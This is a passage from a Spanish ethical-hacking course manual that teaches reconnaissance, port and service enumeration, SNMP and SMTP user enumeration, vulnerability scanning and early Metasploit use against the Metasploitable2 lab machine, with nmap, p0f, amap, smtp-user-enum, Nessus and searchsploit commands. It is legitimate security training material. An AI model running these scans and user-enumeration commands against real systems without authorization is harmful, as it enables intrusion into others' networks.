> para pruebas de estrés para la pila de red, envenenamiento del cache ARP, ataque para la negación de servicio, trazado de la red, ec. Nping también permite un modo eco novato, lo cual permite a los usuarios ver como los paquetes cambian en tránsito entre los host de origen y de destino. Esto es muy bueno para entender las reglas del firewall, detectar corrupción de paquetes, y más.
>
> ```bash
> # nping -h
> # nping [Dirección_IP]
> ```
>
> Imagen 6-2. nping enviando tres paquetes ICMP Echo Request nping utiliza por defecto el protocolo ICMP. En caso el host objetivo esté bloqueando este protocolo, se puede utilizar el modo de prueba TCP.
>
> ```bash
> # nping --tcp [Dirección_IP]
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 27
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital La opción “--tcp” es el modo que permite al usuario crear y enviar cualquier tipo de paquete TCP. Estos paquetes se envían incrustados en paquetes IP que pueden también ser afinados 6.2 Reconocimiento del Sistema Operativo Este procedimiento trata de determinar el sistema operativo funcionando en los objetivos activos, para conocer el tipo y versión del sistema operativo a intentar penetrar.
>
> nmap https://nmap.org/ Una de las características mejores conocidas de Nmap es la detección remota del Sistema Operativo utilizando el reconocimiento de la huella correspondiente a la pila TCP/IP. Nmap envía un serie de paquetes TCP y UDP hacia el host remoto y examina prácticamente cada bit en las respuestas.
>
> Después de realizar docenas de pruebas como muestreo ISN TCP, soporte de opciones TCP y ordenamiento, muestreo ID IP, y verificación inicial del tamaño de ventana, Nmap compara los resultados con su base de datos, la cual incluye más de 2,600 huellas para Sistemas Operativos conocidos, e imprime los detalles del Sistema Operativo si existe una coincidencia.
>
> Detección del Sistema Operativo (Nmap): https://nmap.org/book/man-os-detection.html
>
> ```bash
> # nmap -O [Dirección_IP]
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 28
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital La opción “-O” permite la detección del Sistema Operativo enviando un serie de paquetes TCP y UDP al host remoto, para luego examinar prácticamente cualquier bit en las respuestas. Adicionalmente se puede utilizar la opción “-A” para habilitar la detección del Sistema Operativo junto con otras cosas.
>
> Imagen 6-3. Información del Sistema Operativo de Metasploitable2, obtenidos por nmap. p0f http://lcamtuf.coredump.cx/p0f3/ P0f es una herramienta la cual utiliza un arreglo de mecanismos sofisticados puramente pasivas de tráfico, para identificar los implicados detrás de cualquier comunicación TCP/IP incidental (frecuentemente algo tan pequeño como un SYN normal, sin interferir de ninguna manera. La versión 3 es una completa rescritura del código base original, incorporando un número significativo de mejoras para el reconocimiento de la huella a nivel de red, y presentado la capacidad de razonar sobre las cargas útiles a nivel de aplicación (por ejemplo HTTP).
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 29
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ```bash
> # p0f -h
> # p0f -i [Interfaz] -d -o /tmp/resultado_p0f.txt
> ```
>
> La opción “-i” le indica a p0f3 atender en la interfaz de red especificada. La opción “-d” genera un bifurcación en segundo plano, esto requiere usar la opción “-o” o “-s”. La opción “-o” escribe la información capturada a un archivo de registro especifico. Imagen 6-4. Instalación satisfactorio de p0f.
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 30
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 6-5. Información obtenida por p0f sobre Metasploitable2 Para obtener resultados similares a los expuestos en la Imagen 6-5, se debe establecer una conexión hacia puerto 80 de Metasploitable2 utilizando el siguiente comando
>
> ```bash
> # echo -e "HEAD / HTTP/1.0\r\n" | nc -n [Dirección _IP] 80
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 31
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 7. Enumerar el Objetivo
>
> La enumeración es el procedimiento utilizado para encontrar y recolectar información desde los puertos y servicios disponibles en el objetivo de evaluación. Usualmente este proceso se realiza luego de descubrir el entorno mediante el escaneo para identificar los hosts en funcionamiento.
>
> Usualmente este proceso se realiza al mismo tiempo del proceso de descubrimiento. 7.1 Escaneo de Puertos. Teniendo conocimiento del rango de la red y las máquinas activas en el objetivo de evaluación, es momento de proceder con el escaneo de puertos para obtener un listado de los puertos TCP y UDP en estado abierto o de atención.
>
> Existen diversas técnicas para realizar el escaneo de puertos, entre las más comunes se enumeran las siguientes: Escaneo TCP SYN Escaneo TCP Connect Escaneo TCP ACK Escaneo UDP nmap https://nmap.org/ Muchos de los tipos de escaneo con Nmap están únicamente disponibles para usuarios privilegiados.
>
> Esto es porque se envía y recibe paquetes en bruto, lo cual requiere acceso como root en sistemas Linux. Usando una cuenta administrador en Windows es recomendado, aunque Nmap algunas veces funciona para usuarios no privilegiados sobre una plataforma cuando WinPcap ya ha sido cargado en el Sistema Operativo.
>
> Mientras Nmap intenta producir resultados precisos, se debe considerar todos el conocimiento se basan en los paquetes retornados por los máquinas objetivos (o firewalls en frente de estos). Tales hosts pueden ser poco fiables, y enviar respuestas destinadas a confundir a Nmap. Muchos más comunes son los hosts no compatibles con el RFC, los cuales no responden como deberían a las pruebas de Nmap. Los escaneos FIN, NULL, y Xmas son particularmente susceptibles a este problema. Tales problemas son específicos hacia ciertos tipos de escaneo.
>
> Por defecto nmap utiliza un escaneo SYN, pero este es substituido por un escaneo Connect si el usuario no tiene los privilegios necesarios para enviar paquetes en bruto. Además de no especificarse los puertos, se escanean los 1,000 puertos más populares. Técnicas para el Escaneo de Puertos (Nmap)
>
> https://nmap.org/book/man-port-scanning-techniques.html Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 32
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ```bash
> # nmap [Dirección_IP]
> ```
>
> Imagen 7-1. Información obtenida con una escaneo por defecto utilizando nmap Para definir un conjunto de puertos a escanear contra un objetivo, se debe utilizar la opción “-p” de nmap, seguido de la lista de puertos o rango de puertos.
>
> ```bash
> # nmap -p1-65535 [Dirección_IP]
> # nmap -p 80 192.168.1.0/24
> # nmap -p 80 192.168.1.0/24 -oA /tmp/resultado_nmap_p80.txt
> ```
>
> La opción “-oA” le indica a nmap a guardar a la vez los resultados del escaneo en el formato normal, Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 33
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital formato XML, y formato manejable con el comando “grep”. Estos serán respectivamente almacenados en archivos con las extensiones nmap, xml, gnmap. Figura 7-2. Resultados obtenidos con nmap al escanear todos los puertos.
>
> zenmap https://nmap.org/zenmap/ Zenmap es un GUI (Interfaz Gráfica de Usuario) oficial para el escaner Nmap. Es una aplicación libre multiplataforma (Linux, Windows, Mac OS X, BSD, etc) y open source, el cual facilita el uso de nmap a los principiantes, a la vez de proporcionar características avanzadas para los usuarios más experimentados. Frecuentemente los escaneos utilizados pueden ser guardados como perfiles para hacerlos más fáciles de ejecutar repetidamente. Un creador de comandos permite la creación interactiva de líneas de comando para Nmap. Los resultados de Nmap pueden ser guardados y vistos posteriormente. Los escaneos guardados pueden ser comparados, para ver si difieren. Los resultados de los escaneos recientes son almacenados en una base de datos factible de ser buscada.
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 34
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 7-3. Ventana de Zenmap 7.2 Enumeración de Servicios La determinación de los servicios en funcionamiento en cada puerto específico puede asegurar una prueba de penetración satisfactoria sobre la red objetivo. También puede eliminar cualquier duda generada durante el proceso de reconocimiento sobre la huella del sistema operativo.
>
> nmap https://nmap.org/ Nmap puede indicar cuales puertos TCP o UDP está abiertos. Utilizando la base de datos de Nmap de casi 2,200 servicios bien conocidos, Nmap podría reportar aquellos puertos correspondientes a servidores de correo (SMTP), servidores web (HTTP), y servidores de nombres (DNS). Esta consulta es usualmente precisa, la vasta mayoría de demonios en el puerto TCP 25 son de hecho servidores d Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 35
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital correo. Sin embargo, podría no ser preciso, pues se pueden ejecutar servicios en puertos extraños. Al realizar evaluaciones de vulnerabilidades (o incluso inventarios de red) de empresas o clientes, se requiere conocer cuales servidores y versiones de DNS o correo están ejecutando. Tener un número de versión preciso ayuda dramáticamente a determinar a cual código de explotación es vulnerable un servidor. La detección de versión ayuda a obtener está información.
>
> Después de descubrir los puertos TCP y UDP utilizando algunos de los escaneos proporcionados por Nmap, la detección de versiones interroga estos puertos para determinar más sobre lo cual está actualmente en funcionamiento. La base de datos de Nmap contiene pruebas para consultar diversos servicios y expresiones de correspondencia para reconocer e interpretar las respuestas. Nmap intenta determinar el protocolo del servicio(por ejemplo, FTP, SSH, Telnet, HTTP), el nombre de la aplicación (por ejemplo, ISC BIND, Apache httpd, Solaris telnetd ), el número de versión, nombre del host, tipo de dispositivo (ejemplo, impresora, encaminador), familia del sistema operativo (ejemplo, Windows, Linux).
>
> Detección de Servicios y Versiones (Nmap): https://nmap.org/book/man-version-detection.html
>
> ```bash
> # nmap -sV [Dirección_IP]
> ```
>
> La opción “-sV” de nmap habilita la detección de versión. Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 36
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 7-4. Información obtenida del escaneo de versiones con nmap. amap https://tools.kali.org/information-gathering/amap Amap fue una herramienta de primera generación para el escaneo. Intenta identificar aplicaciones incluso si se están ejecutando sobre un puerto diferente al normal. También identifica aplicaciones basados en no ASCII. Esto se logra enviando paquetes activadores, y consultando las respuestas en una lista de cadenas de respuesta.
>
> ```bash
> # amap -h
> # amap -bq [Dirección_IP] 1-100
> ```
>
> La opción “-b” de amap imprime los banners en ASCII, en caso alguna sea recibida. La opción “-q” de amap implica que todos los puertos cerrados o con tiempo de espera alto NO serán Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 37
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital marcados como no identificados, y por lo tanto no serán reportados. Imagen 7-5. Ejecución de amap contra el puerto 25 La enumeración DNS es el procedimiento de localizar todos los servidores DNS y entradas DNS de una organización objetivo, para capturar información crítica como nombres de usuarios, nombres de computadoras, direcciones IP, y demás.
>
> La enumeración SNMP permite realizar este procedimiento pero utilizado el protocolo SNMP, lo cual puede permitir obtener información como software instalado, usuarios, tiempo de funcionamiento del sistema, nombre del sistema, unidades de almacenamiento, procesos en ejecución y mucha más información.
>
> Para utilizar las dos herramientas siguientes es necesario modificar una línea en el archivo /etc/snmp/snmpd.conf en Metasploitable2. agentAddress udp:[Direccion IP]:161 Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 38
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Donde [Direccion IP] corresponde a la dirección IP de Metasploitable2. Luego que se han realizado los cambios se debe proceder a iniciar el servicio snmpd, con el siguiente comando
>
> ```bash
> # sudo /etc/init.d/snmp start
> ```
>
> snmpwalk https://linux.die.net/man/1/snmpwalk snmpwalk es una aplicación SNMP la cual utiliza peticiones GETNEXT para consultar una entidad de red por un árbol de información. Un OID (Object IDentifier) o Identificador de Objeto puede ser definido en la línea de comando. Este OID especifica cual porción del espacio del identificar de objetivo será buscado utilizando peticiones GETNEXT. Todas las variables en la rama a continuación del OID definido son consultados, y sus valores presentados al usuario.
>
> Si no se especifica un argumento OID, snmpwalk buscará la rama raíz en SNMPv2-SMI::mib-2 (incluyendo cualquier valores de objeto MIB desde otros módulos MIB, los cuales son definidos como pertenecientes a esta rama). Si la entidad de red tiene un error procesando el paquete de petición será retornado y un mensaje será mostrado, lo cual ayuda a identificar porque la solicitud se construyó incorrectamente.
>
> Un OID es un mecanismo de identificación extensamente utilizado desarrollado, para nombrar cualquier tipo de objeto, concepto o “cosa” con nombre globalmente no ambiguo , el cual requiere un nombre persistente (largo tiempo de vida). Este no es está destino a ser utilizado para nombramiento transitorio. Los OIDs, una vez asignados, no puede ser reutilizados para un objeto o cosa diferente.
>
> Se puede obtener más información en el Repositorio de Identificadores de Objetos (OID): http://www.oid-info.com/
>
> ```bash
> # snmpwalk -h
> # snmpwalk -c public [Dirección_ IP] -v 2c
> ```
>
> La opción “-c” de snmpwalk, permite definir la cadena de comunidad (community string). La Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 39
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital autenticación en las versiones 1 y 2 de SNMP se realiza con la cadena de comunidad, la cual es un tipo de contraseña enviada en texto plano entre el gestor y el agente. Si la cadena de comunidad es correcta, el dispositivo responderá con la información solicitada.
>
> La opción “-v” de snmpwalk especifica la versión de SNMP a utilizar. Imagen 7-6. Información obtenida por snmpwalk snmpcheck http://www.nothink.org/codes/snmpcheck/index.php Snmpcheck es una herramienta open source distribuida bajo la licencia GPL. Su objetivo es automatizar el proceso de recopilar información de cualquier dispositivo con soporte al protocolo SNMP (Windows, Linux, appliances de red, impresoras, etc.). Como snmpwalk, snmpcheck permite enumerar dispositivos SNMP y pone la salida en una formato amigable para los seres humanos.
>
> Pudiendo ser útil para pruebas de penetración o vigilancia de sistemas.
>
> ```bash
> # snmpcheck -h
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 40
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ```bash
> # snmpcheck -t [Dirección_IP]
> ```
>
> La opción “-t” de snmpcheck define el host objetivo. También es factible utilizar la opción “-v” para definir la versión 1 o 2 de SNMP. Imagen 7-7. Iniciando la ejecución de snmpcheck contra Metasploitable2 smtp user enum http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum smtp-user-enum es una herramienta para enumerar cuentas de usuario a nivel del sistema operativo mediante un servicio SMTP (sendmail). La enumeración se realiza mediante la inspección de las respuestas a comandos VRFY, EXPN y RCTP TO. Esto podría ser adaptado para funcionar contra otros demonios SMTP vulnerables.
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 41
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ```bash
> # smtp-user-enum -h
> # smtp-user-enum -M VRFY -U /usr/share/metasploit-
> ```
>
> framework/data/wordlists/unix_users.txt -t [Dirección_IP] La opción ”-M” de smtp-user-enum define el método a utilizar para adivinar los nombre de usuarios. El método puede ser (EXPN, VRFY o RCPT), por defecto se utiliza VRFY. La opción “-U” permite definir un archivo conteniendo los nombres de usuario a verificar mediante el servicio SMTP.
>
> El archivo de nombre “unix_users.txt” es un listado de nombres de usuarios comunes en un sistema tipo Unix. En el directorio /usr/share/metasploit-framework/data/wordlists/ se pueden encontrar más listas de palabras de valiosa utilidad para diversos tipos de pruebas.
>
> La opción “-t” define el host servidor ejecutando el servicio SMTP. Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 42
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 7-8. smtp-user-enum obteniendo usuarios de Metasploitable2 Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 43
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 8. Mapear Vulnerabilidades
>
> La tarea de mapear vulnerabilidades consiste en identificar y analizar las vulnerabilidades en los sistemas de la red objetivo. Cuando se ha completado los procedimientos de captura, descubrimiento, y enumeración de información, es momento de identificar las vulnerabilidades. La identificación de vulnerabilidades permite conocer cuales son las vulnerabilidades para las cuales el objetivo es susceptible, y permite realizar un conjunto de ataques más pulido.
>
> 8.1 Vulnerabilidad Local Una vulnerabilidad local es aquella donde un atacante requiere acceso local previo para explotar una vulnerabilidad, ejecutando una pieza de código. Al aprovecharse de este tipo de vulnerabilidad un atacante puede elevar o escalar sus privilegios, para obtener acceso sin restricción en el sistema objetivo.
>
> 8.2 Vulnerabilidad Remota Una Vulnerabilidad Remota es aquella en la cual el atacante no tiene acceso previo, pero la vulnerabilidad puede ser explotada a través de la red. Este tipo de vulnerabilidad permite al atacante obtener acceso a un sistema objetivo sin enfrentar ningún tipo de barrera física o local.
>
> Nessus Vulnerability Scanner https://www.tenable.com/products/nessus/nessus-professional Nessus Professional es una solución para evaluaciones más ampliamente desplegada a nivel mundial, la cual permite identificar vulnerabilidades, problemas de configuración, y malware, lo cual es utilizado por los atacantes para penetrar la red o a los usuarios. Con amplio alcance, la última inteligencia, actualizaciones rápidas, y una interfaz rápida, Nessus ofrece un paquete para el escaneo de vulnerabilidades efectiva y completa a bajo costo.
>
> Nessus Home permite escanear una red casera personal (hasta 16 direcciones IP por escaner) con la misma velocidad, evaluaciones profundas y conveniencia de escaneo sin agente, la cual disfrutan los subscriptores de Nessus. Nesus Home: https://www.tenable.com/products/nessus-home Descargar Nessus desde la siguiente página
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 44
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital https://www.tenable.com/downloads/nessus Seleccionar la versión de Nessus para Ubuntu 11.10, 12.04, 12.10, 13.04, 14.04, 16.04, y 17.10 AMD64. Su instalación se realiza de la siguiente manera
>
> ```bash
> # dpkg -i [Nombre del paquete]
> ```
>
> Para iniciar el demonio de Nessus se debe ejecutar el siguiente comando
>
> ```bash
> # /opt/nessus/sbin/nessus-service -q -D
> ```
>
> También se puede utilizar el siguiente comando, para iniciar Nessus
>
> ```bash
> # service nessusd start
> ```
>
> Una vez que finalizada la instalación de nessus y la ejecución del servidor, abrir la siguiente URL en un navegador web. https://127.0.0.1:8834 Para actualizar los plugins de Nessus se debe utilizar los siguientes comandos.
>
> ```bash
> # cd /opt/nessus/sbin
> # ./nessus-update-plugins
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 45
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 8-1. Formulario de Autenticación para Nessus Luego de Ingresar el nombre de usuario y contraseña, creados durante el proceso de configuración, se presentará la interfaz gráfica para utilizar el escaner de vulnerabilidades.
>
> Directivas o Políticas Una directiva de Nessus está compuesta por opciones de configuración las se relacionan con la realización de un análisis de vulnerabilidades. Se puede obtener más información sobre como crear un directiva en Nessus y obtener información detallada sobre esta, en la siguiente página
>
> https://docs.tenable.com/nessus/7_1/Content/CreateAPolicy.htm Escaneos Después de crear o seleccionar una directiva puede crear un nuevo análisis o escaneo. Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 46
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Se puede obtener más información sobre como crear un escaneo en Nessus y obtener información detallada sobre esto, en la siguiente página: https://docs.tenable.com/nessus/7_1/Content/CreateAScan.htm Imagen 8-2. Resultados del Escaneo Remoto de Vulnerabilidades contra Metasploitable2.
>
> Un documento conteniendo información muy valiosa y útil es la Guía de Usuario de Nessus versión 7.1 en idioma inglés, el cual puede ser descargado visualizado en la siguiente página: https://docs.tenable.com/nessus/7_1/Content/GettingStarted.htm Otro documento igualmente importante es la Guía de Instalación y Configuración de Nessus versión 6.4 en idioma inglés, el cual puede ser descargado desde la siguiente página
>
> http://static.tenable.com/documentation/nessus_6.4_installation_guide.pdf Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 47
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Nmap Scripting Engine (NSE) Nmap Scripting Engine (NSE) es una de las características más poderosas y flexibles de Nmap. Permite a los usuarios a escribir (y compartir) scripts sencillos para automatizar una amplia diversidad de tareas para redes. Estos scripts son luego ejecutados en paralelo con la velocidad y eficiencia esperada de Nmap. Los usuarios pueden confiar en el creciente y diverso conjunto de scripts distribuidos por Nmap, o escribir los propios para satisfacer necesidades personales.
>
> Los NSE han sido diseñados para ser versátiles, con las siguientes tareas en mente; descubrimiento de la red, detección más sofisticada de las versiones, detección de vulnerabilidades, detección de puertas traseras (backdoors), y explotación de vulnerabilidades. Los scripts están escritos en el lengua de programación LUA.
>
> Nmap Scripting Engine: https://nmap.org/book/nse.html Para realizar un escaneo utilizando todos los NSE de la categoría “vuln” o vulnerabilidades utilizar el siguiente comando.
>
> ```bash
> # nmap -n -Pn --script vuln 192.168.0.16
> ```
>
> La opción “--script” le indica a Nmap realizar un escaneo de scripts utilizando una lista de nombres de archivos separados por comas, categorías de scripts, o directorios. Cada elemento en la lista puede también ser una expresión boolean describiendo un conjunto de scripts más complejo.
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 48
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 8-3. Parte de las vulnerabilidades detectadas por Nmap El listado completo e información detallada sobre las categorías y scripts NSE, se encuentran en la siguiente página.
>
> https://nmap.org/nsedoc/ Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 49
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 9. Explotar el Objetivo
>
> Luego de haber descubierto las vulnerabilidades en los hosts o red objetivo, es momento de intentar explotarlas. La fase de explotación algunas veces finaliza el proceso de la Prueba de Penetración, pero esto depende del contrato, pues existen situaciones donde se debe ingresar de manera más profunda en la red objetivo, esto con el propósito de expandir el ataque por toda la red y ganar todos los privilegios posibles.
>
> 9.1 Repositorios con Exploits Todos los días se reportan diversos tipos de vulnerabilidades, pero en la actualidad solo una pequeña parte de ellas son expuestas o publicadas de manera gratuita. Algunos de estos “exploits”, puede ser descargados desde sitios webs donde se mantienen repositorios de ellos. Algunas de estas páginas se detallan a continuación.
>
> • Exploit DataBase by Offensive Security: https://www.exploit-db.com/ • 0day.today: https://0day.today/ • Packet Storm: https://packetstormsecurity.com/files/tags/exploit/ • Vulnerability & Exploit Database: https://www.rapid7.com/db • SecurityFocus: https://www.securityfocus.com/vulnerabilities • VulDB: https://vuldb.com/ • Exploit Database: https://cxsecurity.com/exploit/ Kali Linux mantiene un repositorio local de exploits de “Exploit-DB”. Esta base de datos local tiene un script de nombre “searchsploit”, el cual permite realizar búsquedas dentro de esta base de datos local.
>
> ```bash
> # searchsploit -h
> # searchsploit vsftpd
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 50
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 9-1. Resultados obtenidos al realizar una búsqueda con el script “searchsploit” Todos los exploits contenidos en este repositorio local está adecuadamente ordenados e identificados. Para leer o visualizar el archivo “/unix/remote/17491.rb”, se pueden utilizar los siguientes comando.
>
> ```bash
> # cd /usr/share/exploitdb/
> # ls
> # cd platforms/unix/remote
> # less 17491.rb
> ```
>
> 9.2 Metasploit Framework Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 51
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital https://github.com/rapid7/metasploit-framework Metasploit Framework (MSF) es más a únicamente una colección de exploits. Es una infraestructura la cual puede ser construida y utilizada para necesidades propias. Esto permite concentrarse en un único entorno, y no reinventar la rueda. MSF es considerado como una de las más sencillas y útiles herramientas para auditorias, actualmente disponible libremente para los profesionales en seguridad.
>
> Incluye una amplio arreglo de exploits con grado comercial, y un amplio entorno para el desarrollo de exploits, permite utilizar herramientas para capturar información, como herramientas para la fase posterior a la explotación. Eso hace a MSF un entorno verdaderamente impresionante.
>
> La consola de Metasploit Framework La consola de Metasploit (msfconsole) es principalmente utilizado para manejar la base de datos de Metasploit, manejar las sesiones, además de configurar y ejecutar los módulos de Metasploit. Su propósito esencial es la explotación. Esta herramienta permite conectarse hacia objetivo de tal manera se puedan ejecutar los exploits contra este.
>
> Dado el hecho Metasploit Framework utiliza PostgreSQL como su Base de Datos, esta debe ser iniciada primero, para luego iniciar la consola de Metasploit Framework.
>
> ```bash
> # service postgresql start
> ```
>
> Para verificar que el servicio se ha iniciado correctamente se debe ejecutar el siguiente comando.
>
> ```bash
> # netstat -tna | grep 5432
> ```
>
> Para mostrar la ayuda Metasploit Framework.
>
> ```bash
> # msfconsole -h
> # msfconsole
> ```
>
> Algunos de los comandos útiles para interactuar con la consola son: msf > help Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 52
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital msf > search [Nombre Módulo] msf > use [Nombre Módulo] msf > set [Nombre Opción] [Nombre Módulo] msf > exploit msf > run msf > exit Imagen 9-2. Consola de Metasploit Framework En el siguiente ejemplo se detalla el uso del módulo auxiliar “SMB User Enumeration (SAM EnumUsers)”. El cual permite determinar cuales son los usuarios locales existentes mediante el servicio SAM RPC.
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 53
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital msf > search smb msf > use auxiliary/scanner/smb/smb_enumusers msf auxiliary(smb_enumusers) > info msf auxiliary(smb_enumusers) > show options msf auxiliary(smb_enumusers) > set RHOSTS [Dirección IP] msf auxiliary(smb_enumusers) > exploit Imagen 9-3. Lista de usuarios obtenidos con el módulo auxiliar smb_enumusers Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 54
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Esta sección la he dejado aquí únicamente con propósitos de conocer la existencia de CLI. Pues actualmente ya no está disponible 9.3 CLI de Metasploit Framework Metasploit CLI (msfcli) es una de las interfaces que permite a Metasploit Framework realizar sus tareas. Esta es una buena interfaz para aprender a manejar Metasploit Framework, o para evaluar / escribir un nuevo exploit. También es útil en caso se requiera utilizarlo en scripts y aplicar automatización para tareas.
>
> ```bash
> # msfcli -h
> # msfcli
> ```
>
> Imagen 9-4. Interfaz en Línea de Comando (CLI) de Metasploit Framework Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 55
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ```bash
> # msfcli [Ruta Exploit] [Opción = Valor]
> ```
>
> El el siguiente ejemplo se utilizar el módulo auxiliar de nombre “MySQL Server Version Enumeration”. El cual permite enumerar la versión de servidores MySQL. Muestra las opciones avanzadas del módulo
>
> ```bash
> # msfcli auxiliary/scanner/mysql/mysql_version A
> ```
>
> Muestra un resumen del módulo
>
> ```bash
> # msfcli auxiliary/scanner/mysql/mysql_version S
> ```
>
> Lista las opciones disponibles del módulo
>
> ```bash
> # msfcli auxiliary/scanner/mysql/mysql_version O
> ```
>
> Ejecutar el módulo auxiliar contra Metasploitable2
>
> ```bash
> # msfcli auxiliary/scanner/mysql/mysql_version RHOSTS=192.168.0.16 E
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 56
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 9-5. Resultado obtenido con el módulo auxiliar mysql_version 9.4 Interacción con Meterpreter Meterpreter es un Payload o carga útil avanzadao, dinámico y ampliable, el cual utiliza actores de inyección DLL en memoria ,y se expande sobre la red en tiempo de ejecución. Este se comunica sobre un actor socket y proporciona una completa interfaz Ruby en el lado del cliente.
>
> Una vez obtenido acceso hacia objetivo de evaluación, se puede utilizar Meterpreter para entregar Payloads (Cargas Útiles). Se utiliza MSFCONSOLE para manejar las sesiones, mientras Meterpreter es la carga actual y tiene el deber de realizar la explotación. Algunos de los comando comúnmente utilizados con Meterpreter son
>
> meterpreter > help meterpreter > background Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 57
>
